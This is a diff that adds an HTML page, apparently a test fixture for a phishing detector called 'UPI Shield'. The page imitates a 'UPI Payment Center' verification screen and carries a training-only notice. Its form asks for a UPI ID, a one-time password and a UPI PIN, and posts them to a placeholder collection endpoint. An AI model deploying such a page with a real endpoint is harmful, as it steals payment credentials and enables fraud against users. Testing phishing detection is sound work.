@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>UPI Payment Verification Simulation</title>
+  <style>
+    body { margin: 0; font-family: Arial, sans-serif; background: #eef3f8; color: #152238; }
+    main { max-width: 420px; margin: 72px auto; padding: 32px; background: #fff; border-radius: 14px; box-shadow: 0 8px 30px #102a431f; }
+    .brand { color: #1769aa; font-size: 22px; font-weight: 700; }
+    h1 { font-size: 24px; margin: 28px 0 8px; }
+    p { color: #526477; line-height: 1.5; }
+    label { display: block; margin: 18px 0 6px; font-weight: 600; }
+    input { box-sizing: border-box; width: 100%; padding: 12px; border: 1px solid #b9c6d3; border-radius: 8px; }
+    button { width: 100%; margin-top: 24px; padding: 13px; border: 0; border-radius: 8px; background: #1769aa; color: white; font-weight: 700; }
+    .notice { padding: 10px; background: #fff5d6; border-radius: 8px; font-size: 13px; }
+  </style>
+</head>
+<body>
+  <main>
+    <div class="brand">UPI Payment Center</div>
+    <h1>Verify your payment</h1>
+    <p class="notice">Training simulation only. Do not enter real credentials.</p>
+    <p>This local page intentionally contains phishing indicators for UPI Shield testing.</p>
+    <form action="https://example.invalid/collect" method="post">
+      <label for="upi">UPI ID</label>
+      <input id="upi" name="upi_id" type="text" autocomplete="off">
+      <label for="otp">One-time password (OTP)</label>
+      <input id="otp" name="otp" type="password" autocomplete="off">
+      <label for="pin">UPI PIN</label>
+      <input id="pin" name="upi_pin" type="password" autocomplete="off">
+      <button type="submit">Verify payment</button>
+    </form>
+  </main>
+</body>
+</html>
